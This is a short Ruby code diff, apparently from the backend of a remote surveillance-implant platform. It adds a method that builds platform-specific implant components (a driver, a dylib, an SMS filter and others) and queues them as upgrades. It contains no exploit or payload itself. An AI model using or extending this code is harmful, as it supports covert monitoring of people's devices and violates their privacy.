@@ -177,7 +177,7 @@ class Item
       build = RCS::DB::Build.factory(:windows)
       build.load({'_id' => factory._id})
       build.unpack
-      build.patch({'demo' => false})
+      build.patch({'demo' => self.demo})
 
       # copy the files in the upgrade collection
       add_upgrade('core64', File.join(build.tmpdir, 'core64'))
@@ -193,6 +193,38 @@ class Item
   def add_upgrade(name, file)
     content = File.binread(file)
     self.upgrade_requests.create!({filename: name, _grid: [RCS::DB::GridFS.put(content, {filename: name})] })
+  end
+
+  def upgrade!
+    return if self.upgradable
+
+    factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+    build = RCS::DB::Build.factory(self.platform.to_sym)
+    build.load({'_id' => factory._id})
+    build.unpack
+    build.patch({'demo' => self.demo})
+
+    # always upgrade the core
+    add_upgrade('core', File.join(build.tmpdir, 'core'))
+
+    # then for each platform we have differences
+    case self.platform
+      when 'windows'
+        add_upgrade('core64', File.join(build.tmpdir, 'core64'))
+      when 'osx'
+        add_upgrade('inputmanager', File.join(build.tmpdir, 'inputmanager'))
+        add_upgrade('xpc', File.join(build.tmpdir, 'xpc'))
+        add_upgrade('driver', File.join(build.tmpdir, 'driver'))
+      when 'ios'
+        add_upgrade('dylib', File.join(build.tmpdir, 'dylib'))
+      when 'winmo'
+        add_upgrade('smsfilter', File.join(build.tmpdir, 'smsfilter'))
+    end
+
+    build.clean
+
+    self.upgradable = true
+    self.save
   end
 
   def add_default_filesystem_requests
